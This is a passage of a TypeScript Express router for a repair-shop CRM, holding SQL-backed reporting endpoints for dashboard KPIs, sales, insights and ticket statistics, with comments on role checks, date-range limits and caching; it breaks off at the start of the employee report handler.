import { Router } from 'express';
import { asyncHandler } from '../middleware/asyncHandler.js';
import { AppError } from '../middleware/errorHandler.js';
import { requireFeature } from '../middleware/tierGate.js';
import { calculateAvgActiveRepairTime, getRecentClosedTicketIds, getClosedTicketIds } from '../utils/repair-time.js';
import { dashboardCache } from '../utils/cache.js';
import { createLogger } from '../utils/logger.js';
import { audit } from '../utils/audit.js';
import { requireStepUpTotp } from '../middleware/stepUpTotp.js';
import type { AsyncDb } from '../db/async-db.js';
import { validateId } from '../utils/validate.js';

const router = Router();

// SEC-H11: Admin or manager role required for financial report endpoints.
// Technicians should not have access to revenue, sales, KPI, or tax data.
function requireAdminOrManager(req: any): void {
  if (req.user?.role !== 'admin' && req.user?.role !== 'manager') {
    throw new AppError('Admin or manager access required', 403);
  }
}

// SEC-H80: Cap report date ranges to prevent OOM / DB-lock from full-history scans.
const REPORTS_DATE_RANGE_DAYS_DEFAULT = 90;
const REPORTS_DATE_RANGE_DAYS_ADMIN = 365;

/**
 * Validates the date range for report endpoints.
 *
 * Rules:
 *  - Missing from/to → caller should default to last 30 days before calling.
 *  - Non-admin users: max 90 days.
 *  - Admin users: max 365 days.
 *  - Ranges beyond 365 days require an async report job (not yet implemented).
 */
function validateReportDateRange(req: any, from: string, to: string): void {
  const f = new Date(from).getTime();
  const t = new Date(to).getTime();
  if (isNaN(f) || isNaN(t)) throw new AppError('Invalid date format', 400);
  const days = (t - f) / 86_400_000;
  const isAdmin = req.user?.role === 'admin';
  if (!isAdmin && days > REPORTS_DATE_RANGE_DAYS_DEFAULT) {
    throw new AppError('Date range exceeds 90 days (admin override required)', 400);
  }
  if (isAdmin && days > REPORTS_DATE_RANGE_DAYS_ADMIN) {
    throw new AppError('Date range exceeds 365 days (long-range requires async report job)', 400);
  }
}

// ─── Dashboard KPIs ───────────────────────────────────────────────────────────

router.get('/dashboard', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  // Cache key includes tenant slug (if multi-tenant) to avoid cross-tenant leaks
  // SEC-L21: also include req.user.role so a cashier request doesn't read a
  // cached response that was computed for an admin (whose view may include
  // revenue / staff leaderboard / inventory value fields a cashier shouldn't
  // see if any field is ever role-gated). Keying by role keeps the warm
  // path per-role while still avoiding per-user cache explosion.
  const tenantSlug = (req as any).tenantSlug || 'default';
  const role = req.user?.role || 'anon';
  const cacheKey = `dashboard:${tenantSlug}:${role}`;
  const cached = dashboardCache.get(cacheKey);
  if (cached) {
    res.json(cached);
    return;
  }

  const adb = req.asyncDb;
  const db = req.db; // needed for sync repair-time utils

  // RPT-TZ4: Derive "today" and "month start" in the tenant's configured
  // timezone so the "revenue today" and "tickets created today" KPIs count
  // on the owner's local calendar, not UTC. Without this a shop in UTC-5
  // would show zero revenue for the last two hours of their business day
  // because UTC has already rolled to tomorrow.
  const tenantTz = getTenantTz(req);
  const localDateParts = new Intl.DateTimeFormat('en-CA', {
    timeZone: tenantTz || 'UTC',
    year: 'numeric', month: '2-digit', day: '2-digit',
  }).formatToParts(new Date());
  const lp = Object.fromEntries(localDateParts.map(p => [p.type, p.value]));
  const today = `${lp.year}-${lp.month}-${lp.day}`; // YYYY-MM-DD in tenant TZ
  const monthStartStr = `${lp.year}-${lp.month}-01`;

  // Parallelize all independent queries
  const [
    openTicketsRow,
    paymentRevTodayRow,
    invoiceRevTodayRow,
    closedTodayRow,
    ticketsCreatedTodayRow,
    appointmentsTodayRow,
    statusGroupCounts,
    perStatusCounts,
    revenueTrend,
    topServices,
    customerTrend,
    inventoryValueRow,
    staffLeaderboard,
  ] = await Promise.all([
    // Open tickets (not closed, not cancelled, not deleted)
    adb.get<any>(`
      SELECT COUNT(*) AS n FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 0 AND ts.is_cancelled = 0
    `),
    // RPT1: Revenue today — CRM payments (from payments table) PLUS imported invoice
    // amount_paid for invoices that have NO payment rows (avoids double-counting the
    // same money when both records exist for an invoice).
    adb.get<any>(`
      SELECT COALESCE(SUM(p.amount), 0) AS total
      FROM payments p
      JOIN invoices i ON i.id = p.invoice_id
      WHERE i.status != 'void' AND DATE(p.created_at) = ?
    `, today),
    adb.get<any>(`
      SELECT COALESCE(SUM(i.amount_paid), 0) AS total
      FROM invoices i
      LEFT JOIN (SELECT DISTINCT invoice_id FROM payments) crm_pay ON crm_pay.invoice_id = i.id
      WHERE i.status IN ('paid', 'overpaid', 'partial')
        AND DATE(i.created_at) = ?
        AND crm_pay.invoice_id IS NULL
    `, today),
    // Tickets closed today
    adb.get<any>(`
      SELECT COUNT(*) AS n FROM ticket_history th
      JOIN tickets t ON t.id = th.ticket_id
      JOIN ticket_statuses ts ON ts.name = th.new_value
      WHERE DATE(th.created_at) = ?
        AND th.action = 'status_change'
        AND ts.is_closed = 1
        AND t.is_deleted = 0
    `, today),
    // Tickets created today
    adb.get<any>(`
      SELECT COUNT(*) AS n FROM tickets
      WHERE is_deleted = 0 AND DATE(created_at) = ?
    `, today),
    // Appointments today
    adb.get<any>(`
      SELECT COUNT(*) AS n FROM appointments
      WHERE DATE(start_time) = ?
    `, today),
    // Status group counts (matching ticket list overview bar)
    adb.get<any>(`
      SELECT
        COUNT(*) AS total,
        COUNT(CASE WHEN ts.is_closed = 0 AND ts.is_cancelled = 0
                    AND LOWER(ts.name) NOT LIKE '%hold%'
                    AND LOWER(ts.name) NOT LIKE '%waiting%'
                    AND LOWER(ts.name) NOT LIKE '%pending%'
                    AND LOWER(ts.name) NOT LIKE '%transit%'
              THEN 1 END) AS open_count,
        COUNT(CASE WHEN ts.is_closed = 0 AND ts.is_cancelled = 0
                    AND (LOWER(ts.name) LIKE '%hold%'
                      OR LOWER(ts.name) LIKE '%waiting%'
                      OR LOWER(ts.name) LIKE '%pending%'
                      OR LOWER(ts.name) LIKE '%transit%')
              THEN 1 END) AS on_hold_count,
        COUNT(CASE WHEN ts.is_closed = 1 THEN 1 END) AS closed_count,
        COUNT(CASE WHEN ts.is_cancelled = 1 THEN 1 END) AS cancelled_count
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0
    `),
    // Per-status breakdown (individual counts for each active status)
    adb.all<any>(`
      SELECT ts.id, ts.name, ts.color, ts.sort_order, ts.is_closed, ts.is_cancelled,
             COUNT(t.id) AS count
      FROM ticket_statuses ts
      LEFT JOIN tickets t ON t.status_id = ts.id AND t.is_deleted = 0
      GROUP BY ts.id
      ORDER BY ts.sort_order ASC
    `),
    // ENR-D1: Revenue trend — last 12 months of revenue
    adb.all<any>(`
      SELECT
        STRFTIME('%Y-%m', COALESCE(p.created_at, i.created_at)) AS month,
        COALESCE(SUM(p.amount), 0) + COALESCE(SUM(
          CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END
        ), 0) AS revenue
      FROM invoices i
      LEFT JOIN payments p ON p.invoice_id = i.id
      WHERE i.status != 'void'
        AND DATE(COALESCE(p.created_at, i.created_at)) >= DATE('now', '-12 months')
      GROUP BY month
      ORDER BY month ASC
    `),
    // RPT4: Top services by revenue — top 5 repair services, last 12 months.
    // Must match the default range used by the drill-in /insights report so
    // dashboard totals line up with the detail view.
    adb.all<any>(`
      SELECT
        td.service_name AS name,
        COUNT(*) AS count,
        COALESCE(SUM(td.price), 0) AS revenue
      FROM ticket_devices td
      JOIN tickets t ON t.id = td.ticket_id
      WHERE t.is_deleted = 0
        AND td.service_name IS NOT NULL AND td.service_name != ''
        AND DATE(t.created_at) >= DATE('now', '-12 months')
      GROUP BY td.service_name
      ORDER BY revenue DESC
      LIMIT 5
    `),
    // ENR-D3: Customer acquisition trend — new customers per month, last 6 months
    adb.all<any>(`
      SELECT
        STRFTIME('%Y-%m', created_at) AS month,
        COUNT(*) AS new_customers
      FROM customers
      WHERE is_deleted = 0
        AND DATE(created_at) >= DATE('now', '-6 months')
      GROUP BY month
      ORDER BY month ASC
    `),
    // ENR-D4: Inventory value — total cost_price * in_stock for active items
    adb.get<any>(`
      SELECT COALESCE(SUM(cost_price * in_stock), 0) AS total
      FROM inventory_items
      WHERE is_active = 1 AND item_type != 'service'
    `),
    // ENR-D5: Staff performance leaderboard — top 5 techs by tickets closed this month
    adb.all<any>(`
      SELECT
        u.first_name || ' ' || u.last_name AS name,
        COUNT(*) AS tickets_closed,
        COALESCE(SUM(t.total), 0) AS revenue
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      JOIN users u ON u.id = t.assigned_to
      WHERE t.is_deleted = 0 AND ts.is_closed = 1
        AND DATE(t.updated_at) BETWEEN ? AND ?
      GROUP BY t.assigned_to
      ORDER BY tickets_closed DESC
      LIMIT 5
    `, monthStartStr, today),
  ]);

  const openTickets = openTicketsRow?.n ?? 0;
  const paymentRevToday = paymentRevTodayRow?.total ?? 0;
  const invoiceRevToday = invoiceRevTodayRow?.total ?? 0;
  // RPT1: sum payments + imported-invoice-fallback because the two queries are now
  // mutually exclusive (imported invoice query excludes rows that have payments).
  const revenueToday = paymentRevToday + invoiceRevToday;
  const closedToday = closedTodayRow?.n ?? 0;
  const ticketsCreatedToday = ticketsCreatedTodayRow?.n ?? 0;
  const appointmentsToday = appointmentsTodayRow?.n ?? 0;
  const inventoryValue = inventoryValueRow?.total ?? 0;

  // Average ACTIVE repair time in hours (closed tickets, last 30 days)
  // Excludes time in hold/waiting statuses — uses sync db
  const recentClosedIds = getRecentClosedTicketIds(db, 30);
  const avgRepair = calculateAvgActiveRepairTime(db, recentClosedIds);

  const response = {
    success: true,
    data: {
      open_tickets: openTickets,
      revenue_today: revenueToday,
      closed_today: closedToday,
      tickets_created_today: ticketsCreatedToday,
      appointments_today: appointmentsToday,
      avg_repair_hours: avgRepair ? Math.round(avgRepair * 10) / 10 : null,
      status_groups: {
        total: statusGroupCounts?.total ?? 0,
        open: statusGroupCounts?.open_count ?? 0,
        on_hold: statusGroupCounts?.on_hold_count ?? 0,
        closed: statusGroupCounts?.closed_count ?? 0,
        cancelled: statusGroupCounts?.cancelled_count ?? 0,
      },
      status_counts: perStatusCounts,
      revenue_trend: revenueTrend,
      top_services: topServices,
      customer_trend: customerTrend,
      inventory_value: inventoryValue,
      staff_leaderboard: staffLeaderboard,
    },
  };

  // Cache for 60 seconds to avoid re-running expensive aggregation queries
  dashboardCache.set(cacheKey, response, 60_000);
  res.json(response);
}));

// ─── Dashboard KPIs (enhanced) ────────────────────────────────────────────

router.get('/dashboard-kpis', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date().toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);
  const employeeId = req.query.employee_id ? Number(req.query.employee_id) : null;

  const empFilter = employeeId ? ' AND t.assigned_to = ?' : '';
  const empFilterInv = employeeId ? ' AND i.created_by = ?' : '';
  const empParams = employeeId ? [employeeId] : [];

  // RPT8: Screen view uses small LIMITs (30 daily rows, 20 open tickets) to
  // keep dashboard responsive. When export_all=true is passed, raise the limit
  // to 10000 so CSV/download paths can pull the full period without the screen
  // truncating them. The 10000 cap is a hard DoS guard.
  const exportAll = req.query.export_all === 'true' || req.query.export_all === '1';
  const dailySalesLimit = exportAll ? 10000 : 30;
  const openTicketsLimit = exportAll ? 10000 : 20;

  // Parallelize all independent scalar queries
  const [
    totalSalesRow,
    taxRow,
    discountsRow,
    cogsRow,
    refundsRow,
    expensesRow,
    receivablesRow,
    repairTicketsSales,
    productSales,
    daily_sales,
    open_tickets,
  ] = await Promise.all([
    // Total sales: CRM payments + imported invoice amount_paid (for invoices without CRM payments)
    // PERF-7: Replaced NOT EXISTS with LEFT JOIN for imported invoices to avoid repeated subquery scan
    adb.get<any>(`
      SELECT COALESCE(SUM(revenue), 0) AS v FROM (
        -- CRM payments (from payments table)
        SELECT SUM(p.amount) AS revenue
        FROM payments p
        JOIN invoices i ON i.id = p.invoice_id
        WHERE i.status != 'void' AND DATE(p.created_at) BETWEEN ? AND ?${empFilterInv}
        UNION ALL
        -- Imported invoices (amount_paid, only for invoices with NO CRM payment records)
        SELECT SUM(i.amount_paid) AS revenue
        FROM invoices i
        LEFT JOIN (SELECT DISTINCT invoice_id FROM payments) crm_pay ON crm_pay.invoice_id = i.id
        WHERE i.status IN ('paid', 'overpaid', 'partial')
          AND DATE(i.created_at) BETWEEN ? AND ?${empFilterInv}
          AND crm_pay.invoice_id IS NULL
      )
    `, from, to, ...empParams, from, to, ...empParams),
    // Tax collected
    adb.get<any>(`
      SELECT COALESCE(SUM(ili.tax_amount), 0) AS v
      FROM invoice_line_items ili
      JOIN invoices i ON i.id = ili.invoice_id
      WHERE i.status != 'void' AND DATE(i.created_at) BETWEEN ? AND ?${empFilterInv}
    `, from, to, ...empParams),
    // Discounts
    adb.get<any>(`
      SELECT COALESCE(SUM(i.discount), 0) AS v
      FROM invoices i
      WHERE i.status != 'void' AND DATE(i.created_at) BETWEEN ? AND ?${empFilterInv}
    `, from, to, ...empParams),
    // COGS (cost of parts used — prefer inventory cost_price, fallback to supplier catalog min price)
    // PERF-6: Pre-aggregate supplier catalog min prices via subquery JOIN instead of
    // correlated subquery per row. Uses idx_supplier_catalog_name_price expression index.
    adb.get<any>(`
      SELECT COALESCE(SUM(
        COALESCE(NULLIF(ii.cost_price, 0), sc_min.min_price, 0) * tdp.quantity
      ), 0) AS v
      FROM ticket_device_parts tdp
      JOIN ticket_devices td ON td.id = tdp.ticket_device_id
      JOIN tickets t ON t.id = td.ticket_id
      LEFT JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
      LEFT JOIN (
        SELECT LOWER(TRIM(name)) AS norm_name, MIN(price) AS min_price
        FROM supplier_catalog WHERE price > 0
        GROUP BY LOWER(TRIM(name))
      ) sc_min ON ii.cost_price = 0 AND sc_min.norm_name = LOWER(TRIM(ii.name))
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?${empFilter}
    `, from, to, ...empParams),
    // Refunds
    adb.get<any>(`
      SELECT COALESCE(SUM(p.amount), 0) AS v
      FROM payments p
      JOIN invoices i ON i.id = p.invoice_id
      WHERE i.status = 'refunded' AND DATE(p.created_at) BETWEEN ? AND ?${empFilterInv}
    `, from, to, ...empParams),
    // Expenses
    adb.get<any>(`
      SELECT COALESCE(SUM(amount), 0) AS v
      FROM expenses
      WHERE DATE(created_at) BETWEEN ? AND ?
    `, from, to),
    // Account receivables
    adb.get<any>(`
      SELECT COALESCE(SUM(i.total - COALESCE(paid.total_paid, 0)), 0) AS v
      FROM invoices i
      LEFT JOIN (SELECT invoice_id, SUM(amount) as total_paid FROM payments GROUP BY invoice_id) paid ON paid.invoice_id = i.id
      WHERE i.status IN ('unpaid', 'partial') AND DATE(i.created_at) BETWEEN ? AND ?${empFilterInv}
    `, from, to, ...empParams),
    // Sales by item type — Repair Tickets
    adb.get<any>(`
      SELECT
        COUNT(DISTINCT t.id) AS quantity,
        COALESCE(SUM(t.total), 0) AS sales,
        COALESCE(SUM(t.discount), 0) AS discounts,
        COALESCE(SUM(cogs_sub.cogs), 0) AS cogs,
        COALESCE(SUM(t.total_tax), 0) AS tax
      FROM tickets t
      LEFT JOIN (
        SELECT td.ticket_id, SUM(COALESCE(NULLIF(ii.cost_price, 0), sc_min.min_price, 0) * tdp.quantity) AS cogs
        FROM ticket_device_parts tdp
        JOIN ticket_devices td ON td.id = tdp.ticket_device_id
        LEFT JOIN inventory_items ii ON ii.id = tdp.inventory_item_id
        LEFT JOIN (
          SELECT LOWER(TRIM(name)) AS norm_name, MIN(price) AS min_price
          FROM supplier_catalog WHERE price > 0
          GROUP BY LOWER(TRIM(name))
        ) sc_min ON ii.cost_price = 0 AND sc_min.norm_name = LOWER(TRIM(ii.name))
        GROUP BY td.ticket_id
      ) cogs_sub ON cogs_sub.ticket_id = t.id
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?${empFilter}
    `, from, to, ...empParams),
    // RPT3: Products — real COGS from inventory_items.cost_price (LEFT JOIN so
    // line items with no matching inventory record count as unknown cost = 0).
    // Excludes invoices converted from tickets to avoid double-counting with Repair Tickets.
    adb.get<any>(`
      SELECT
        COALESCE(SUM(ili.quantity), 0) AS quantity,
        COALESCE(SUM(ili.total), 0) AS sales,
        COALESCE(SUM(ili.line_discount), 0) AS discounts,
        COALESCE(SUM(COALESCE(ii.cost_price, 0) * ili.quantity), 0) AS cogs,
        COALESCE(SUM(ili.tax_amount), 0) AS tax
      FROM invoice_line_items ili
      JOIN invoices i ON i.id = ili.invoice_id
      LEFT JOIN inventory_items ii ON ii.id = ili.inventory_item_id
      WHERE i.status != 'void' AND i.ticket_id IS NULL AND DATE(i.created_at) BETWEEN ? AND ?${empFilterInv}
    `, from, to, ...empParams),
    // RPT2: Daily sales — real COGS + tax + margin instead of hardcoded values.
    // Each day: sum of payments (revenue), joined against per-invoice COGS
    // (from product line items via inventory_items.cost_price) and per-invoice
    // tax (from invoice_line_items.tax_amount). Margin is (rev - cogs)/rev * 100
    // or NULL when revenue is 0 (avoid /0). Note: tax and COGS are keyed by
    // invoice, so splitting one invoice across multiple payment days would count
    // that invoice's cogs/tax on every payment day — acceptable since same-day
    // payments are the overwhelming norm for this report.
    adb.all<any>(`
      SELECT
        DATE(p.created_at) AS date,
        COALESCE(SUM(p.amount), 0) AS sale,
        COALESCE(SUM(inv_cogs.cogs), 0) AS cogs,
        COALESCE(SUM(p.amount), 0) - COALESCE(SUM(inv_cogs.cogs), 0) AS net_profit,
        CASE
          WHEN COALESCE(SUM(p.amount), 0) > 0
          THEN ROUND(
            (COALESCE(SUM(p.amount), 0) - COALESCE(SUM(inv_cogs.cogs), 0))
            / SUM(p.amount) * 100, 1)
          ELSE NULL
        END AS margin,
        COALESCE(SUM(inv_tax.tax), 0) AS tax
      FROM payments p
      JOIN invoices i ON i.id = p.invoice_id
      LEFT JOIN (
        SELECT ili.invoice_id,
               SUM(COALESCE(ii.cost_price, 0) * ili.quantity) AS cogs
        FROM invoice_line_items ili
        LEFT JOIN inventory_items ii ON ii.id = ili.inventory_item_id
        GROUP BY ili.invoice_id
      ) inv_cogs ON inv_cogs.invoice_id = i.id
      LEFT JOIN (
        SELECT invoice_id, SUM(tax_amount) AS tax
        FROM invoice_line_items
        GROUP BY invoice_id
      ) inv_tax ON inv_tax.invoice_id = i.id
      WHERE i.status != 'void' AND DATE(p.created_at) BETWEEN ? AND ?${empFilterInv}
      GROUP BY DATE(p.created_at)
      ORDER BY date DESC
      LIMIT ?
    `, from, to, ...empParams, dailySalesLimit),
    // Open tickets
    adb.all<any>(`
      SELECT
        t.id, t.order_id,
        COALESCE(td.device_name, '') AS task,
        td.due_on AS due_at,
        COALESCE(u.first_name || ' ' || u.last_name, '') AS assigned_to,
        COALESCE(c.first_name || ' ' || c.last_name, '') AS customer_name,
        ts.name AS status_name,
        ts.color AS status_color
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      LEFT JOIN (
        SELECT ticket_id, MIN(id) AS first_device_id, device_name, due_on
        FROM ticket_devices
        GROUP BY ticket_id
      ) td ON td.ticket_id = t.id
      LEFT JOIN users u ON u.id = t.assigned_to
      LEFT JOIN customers c ON c.id = t.customer_id
      WHERE t.is_deleted = 0 AND ts.is_closed = 0 AND ts.is_cancelled = 0
      ORDER BY t.created_at DESC
      LIMIT ?
    `, openTicketsLimit),
  ]);

  const totalSales = totalSalesRow?.v ?? 0;
  const tax = taxRow?.v ?? 0;
  const discounts = discountsRow?.v ?? 0;
  const cogs = cogsRow?.v ?? 0;
  const net_profit = totalSales - cogs - discounts;
  const refunds = refundsRow?.v ?? 0;
  const expenses = expensesRow?.v ?? 0;
  const receivables = receivablesRow?.v ?? 0;

  const sales_by_type = [
    {
      type: 'Repair Tickets',
      quantity: repairTicketsSales?.quantity ?? 0,
      sales: repairTicketsSales?.sales ?? 0,
      discounts: repairTicketsSales?.discounts ?? 0,
      cogs: repairTicketsSales?.cogs ?? 0,
      net_profit: (repairTicketsSales?.sales ?? 0) - (repairTicketsSales?.cogs ?? 0) - (repairTicketsSales?.discounts ?? 0),
      tax: repairTicketsSales?.tax ?? 0,
    },
    {
      type: 'Products',
      quantity: productSales?.quantity ?? 0,
      sales: productSales?.sales ?? 0,
      discounts: productSales?.discounts ?? 0,
      cogs: productSales?.cogs ?? 0,
      net_profit: (productSales?.sales ?? 0) - (productSales?.cogs ?? 0) - (productSales?.discounts ?? 0),
      tax: productSales?.tax ?? 0,
    },
  ];

  res.json({
    success: true,
    data: {
      total_sales: totalSales,
      tax,
      discounts,
      cogs,
      net_profit,
      refunds,
      expenses,
      receivables,
      sales_by_type,
      daily_sales,
      open_tickets,
    },
  });
}));

// ─── Insights (Charts) ──────────────────────────────────────────────────────

router.get('/insights', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  // RPT4: Default to the same ~12-month window as the dashboard top-services
  // card so the drill-in detail view matches the summary on first load.
  // Callers can still override with explicit from_date / to_date.
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  const defaultFrom = new Date();
  defaultFrom.setMonth(defaultFrom.getMonth() - 12);
  const from = (req.query.from_date as string) || defaultFrom.toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const [popular_models, repairs_by_month, revenue_by_model, popular_services] = await Promise.all([
    // Most popular models repaired (top 10)
    adb.all<any>(`
      SELECT td.device_name AS name, COUNT(*) AS count
      FROM ticket_devices td
      JOIN tickets t ON t.id = td.ticket_id
      WHERE t.is_deleted = 0 AND td.device_name IS NOT NULL AND td.device_name != ''
        AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY td.device_name
      ORDER BY count DESC
      LIMIT 10
    `, from, to),
    // Repairs by month
    adb.all<any>(`
      SELECT STRFTIME('%Y-%m', t.created_at) AS month, COUNT(*) AS count
      FROM tickets t
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY month
      ORDER BY month ASC
    `, from, to),
    // Revenue by model (top 10)
    adb.all<any>(`
      SELECT td.device_name AS name, COALESCE(SUM(td.price), 0) AS revenue
      FROM ticket_devices td
      JOIN tickets t ON t.id = td.ticket_id
      WHERE t.is_deleted = 0 AND td.device_name IS NOT NULL AND td.device_name != ''
        AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY td.device_name
      ORDER BY revenue DESC
      LIMIT 10
    `, from, to),
    // Most popular repair services (top 10)
    adb.all<any>(`
      SELECT td.service_name AS name, COUNT(*) AS count
      FROM ticket_devices td
      JOIN tickets t ON t.id = td.ticket_id
      WHERE t.is_deleted = 0 AND td.service_name IS NOT NULL AND td.service_name != ''
        AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY td.service_name
      ORDER BY count DESC
      LIMIT 10
    `, from, to),
  ]);

  res.json({
    success: true,
    data: {
      popular_models,
      repairs_by_month,
      revenue_by_model,
      popular_services,
    },
  });
}));

// ─── Sales Report ─────────────────────────────────────────────────────────────

router.get('/sales', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 30 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);
  const groupBy = (req.query.group_by as string) || 'day'; // day | week | month

  // For weeks, use the Monday date (start of ISO week) so frontend can match
  const dateFormat = groupBy === 'month' ? '%Y-%m' : '%Y-%m-%d';
  const groupExpr = groupBy === 'week'
    ? "DATE(COALESCE(p.created_at, i.created_at), 'weekday 1', '-7 days')"
    : `STRFTIME('${dateFormat}', COALESCE(p.created_at, i.created_at))`;

  // Compare with previous period of same length
  const daysDiff = Math.round((new Date(to).getTime() - new Date(from).getTime()) / 86400_000);
  const prevTo = new Date(new Date(from).getTime() - 86400_000).toISOString().slice(0, 10);
  const prevFrom = new Date(new Date(prevTo).getTime() - daysDiff * 86400_000).toISOString().slice(0, 10);

  const [rows, totals, byMethod, prevTotals] = await Promise.all([
    // Use payments when available, fall back to invoice amount_paid for imported data
    adb.all<any>(`
      SELECT
        ${groupExpr} AS period,
        COUNT(DISTINCT i.id) AS invoices,
        COALESCE(SUM(p.amount), 0) AS payment_revenue,
        COALESCE(SUM(CASE WHEN p.id IS NULL THEN i.amount_paid ELSE 0 END), 0) AS imported_revenue,
        COUNT(DISTINCT i.customer_id) AS unique_customers
      FROM invoices i
      LEFT JOIN payments p ON p.invoice_id = i.id
      WHERE i.status != 'void' AND DATE(COALESCE(p.created_at, i.created_at)) BETWEEN ? AND ?
      GROUP BY period
      ORDER BY period ASC
    `, from, to),
    adb.get<any>(`
      SELECT
        COUNT(DISTINCT i.id) AS total_invoices,
        COALESCE(SUM(p.amount), 0) AS payment_revenue,
        COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0) AS imported_revenue,
        COUNT(DISTINCT i.customer_id) AS unique_customers
      FROM invoices i
      LEFT JOIN payments p ON p.invoice_id = i.id
      WHERE i.status != 'void' AND DATE(COALESCE(p.created_at, i.created_at)) BETWEEN ? AND ?
    `, from, to),
    adb.all<any>(`
      SELECT COALESCE(p.method, 'Other') AS method, SUM(p.amount) AS revenue, COUNT(*) AS count
      FROM payments p
      JOIN invoices i ON i.id = p.invoice_id
      WHERE i.status != 'void' AND DATE(p.created_at) BETWEEN ? AND ?
      GROUP BY COALESCE(p.method, 'Other')
      ORDER BY revenue DESC
    `, from, to),
    adb.get<any>(`
      SELECT
        COALESCE(SUM(p.amount), 0) + COALESCE(SUM(CASE WHEN p.id IS NULL AND i.amount_paid > 0 THEN i.amount_paid ELSE 0 END), 0) AS total_revenue
      FROM invoices i
      LEFT JOIN payments p ON p.invoice_id = i.id
      WHERE i.status != 'void' AND DATE(COALESCE(p.created_at, i.created_at)) BETWEEN ? AND ?
    `, prevFrom, prevTo),
  ]);

  // Combine payment + imported revenue
  const combinedRows = rows.map((r: any) => ({
    period: r.period,
    invoices: r.invoices,
    revenue: r.payment_revenue + r.imported_revenue,
    unique_customers: r.unique_customers,
  }));

  const totalRevenue = (totals?.payment_revenue || 0) + (totals?.imported_revenue || 0);
  const prevRevenue = prevTotals?.total_revenue || 0;
  const revenueChange = prevRevenue > 0 ? ((totalRevenue - prevRevenue) / prevRevenue) * 100 : null;

  res.json({
    success: true,
    data: {
      rows: combinedRows,
      totals: {
        total_invoices: totals?.total_invoices ?? 0,
        total_revenue: totalRevenue,
        unique_customers: totals?.unique_customers ?? 0,
        previous_revenue: prevRevenue,
        revenue_change_pct: revenueChange != null ? Math.round(revenueChange * 10) / 10 : null,
      },
      byMethod,
      from,
      to,
    },
  });
}));

// ─── Ticket Report ────────────────────────────────────────────────────────────

router.get('/tickets', asyncHandler(async (req, res) => {
  const adb = req.asyncDb;
  const db = req.db; // needed for sync repair-time utils
  const from = (req.query.from_date as string) || new Date(Date.now() - 30 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
  validateReportDateRange(req, from, to);

  const [byStatus, byDay, byTech, summary] = await Promise.all([
    adb.all<any>(`
      SELECT ts.name AS status, ts.color, COUNT(*) AS count
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY ts.id
      ORDER BY count DESC
    `, from, to),
    adb.all<any>(`
      SELECT DATE(created_at) AS day, COUNT(*) AS created
      FROM tickets
      WHERE is_deleted = 0 AND DATE(created_at) BETWEEN ? AND ?
      GROUP BY day ORDER BY day ASC
    `, from, to),
    adb.all<any>(`
      SELECT u.first_name || ' ' || u.last_name AS tech_name,
        COUNT(*) AS ticket_count,
        SUM(CASE WHEN ts.is_closed = 1 THEN 1 ELSE 0 END) AS closed_count,
        COALESCE(SUM(t.total), 0) AS total_revenue
      FROM tickets t
      JOIN users u ON u.id = t.assigned_to
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
      GROUP BY t.assigned_to
      ORDER BY ticket_count DESC
    `, from, to),
    // Summary totals
    adb.get<any>(`
      SELECT
        COUNT(*) AS total_created,
        SUM(CASE WHEN ts.is_closed = 1 THEN 1 ELSE 0 END) AS total_closed,
        COALESCE(SUM(t.total), 0) AS total_revenue,
        COALESCE(AVG(t.total), 0) AS avg_ticket_value
      FROM tickets t
      JOIN ticket_statuses ts ON ts.id = t.status_id
      WHERE t.is_deleted = 0 AND DATE(t.created_at) BETWEEN ? AND ?
    `, from, to),
  ]);

  // Avg ACTIVE turnaround time (hours) for closed tickets — excludes hold/waiting time
  // Uses sync db for repair-time utils
  const closedIds = getClosedTicketIds(db, from, to);
  const avgTurnaround = calculateAvgActiveRepairTime(db, closedIds);

  res.json({
    success: true,
    data: {
      byStatus,
      byDay,
      byTech,
      summary: {
        total_created: summary?.total_created || 0,
        total_closed: summary?.total_closed || 0,
        total_revenue: summary?.total_revenue || 0,
        avg_ticket_value: summary?.avg_ticket_value ? Math.round(summary.avg_ticket_value * 100) / 100 : 0,
        avg_turnaround_hours: avgTurnaround ? Math.round(avgTurnaround * 10) / 10 : null,
      },
      from,
      to,
    },
  });
}));

// ─── Employee Report ──────────────────────────────────────────────────────────

router.get('/employees', asyncHandler(async (req, res) => {
  requireAdminOrManager(req);
  const adb = req.asyncDb;
  const from = (req.query.from_date as string) || new Date(Date.now() - 30 * 86400_000).toISOString().slice(0, 10);
  const to = (req.query.to_date as string) || new Date().toISOString().slice(0, 10);
